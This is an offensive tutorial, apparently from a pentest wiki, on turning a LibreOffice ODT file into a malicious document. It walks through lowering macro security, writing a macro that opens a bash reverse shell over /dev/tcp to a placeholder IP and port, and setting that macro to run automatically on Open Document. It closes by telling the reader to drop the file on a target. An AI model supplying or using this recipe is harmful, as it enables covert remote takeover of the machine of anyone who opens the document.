# ODT file with RevShell

This guide will show you how to craft a ODT payload with a LibreOffice file with inside a RevShell.

{% hint style="info" %}
Disable Macro block on LibreOffice

Open Libre offce

Follow this path: Tools/Options/LibreOffice/Security/Macro Security

And select "low" option to disable the macros.
{% endhint %}

First things first, we have to create a ODT file in LibreOffice.

<figure><img src="../../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

Now, open the Macro editor in the file.

_Tools > Macros > Organize Macros > Basic_

Select the current file in the menu and click to "**New**" button and create the macro with a name.

<figure><img src="../../../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

Once the macro editor will show up, we can write code for the reverse shell. In this example we will write a bash command for the connection.

```bash
shell("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
```

<figure><img src="../../../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

Save the macro by hitting **Ctrl+S**.



**And now setup the Macro to automatically run.**

* Turn back to the Libre Document
* Click on _Tools>Macros>Organize Macros> Basic_.
* Select our macro and click on the "Assign" button.
* Click on "Events" tab and then on Open Document and set the macro by clicking the "Macro" button.

<figure><img src="../../../../../.gitbook/assets/image (235).png" alt="" width="500"><figcaption></figcaption></figure>



* Highlight the created macro and click OK. Hit Ctrl+S again to save.



Now we can drop the malicious file to get a revshell.



